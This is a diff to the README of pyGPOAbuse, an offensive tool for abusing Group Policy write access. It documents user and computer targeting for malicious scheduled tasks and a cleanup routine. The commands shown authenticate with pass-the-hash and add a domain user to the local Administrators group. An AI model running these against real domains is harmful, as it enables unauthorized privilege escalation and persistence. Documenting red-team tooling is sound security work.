@@ -34,14 +34,22 @@ Reverse shell example
 ``` 
 
 ### Item Level Targeting
-Scheduled tasks in Group Policy support item level targeting with various filters to narrow down execution scopes. pyGPOAbuse supports filtering via NETBIOS name via the `-computername` parameter in cases where you don't want to execute commands across the entire GPO scope. 
+Scheduled tasks in Group Policy support item level targeting with filters to narrow down execution scopes. Use `-computername` for a NETBIOS computer name. Use `-username` with the required `-usersid` to target a user. Both filters can be combined.
 
 ```
 ./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" -computername SERVER01 -command "net localgroup Administrators domain.local\myuser /add"
 ```
 
+For user and computer targeting together:
+
+```
+./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" -username 'MORDOR\Administrator' -usersid 'S-1-5-21-1845478662-1755228446-3637421469-500' -computername WIN-M8G28I9SNI7 -command 'whoami'
+```
+
+With `-user`, the generated task runs at logon during a 24-hour window starting when the XML is created. It is set to be deleted from the client when that window expires. Computer and `-user-as-admin` tasks remain immediate tasks.
+
 ### Cleanup
-Delete the scheduled task after it executed.
+Delete `ScheduledTasks.xml` from the selected GPO, remove its Scheduled Tasks extension references, and increment the GPO version so clients can detect the change. This deletes every task in that XML file. You can run cleanup again if the XML was already deleted; it will still repair the extension references. It does not directly delete tasks already present on client machines.
 
 ```bash
 ./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" --cleanup
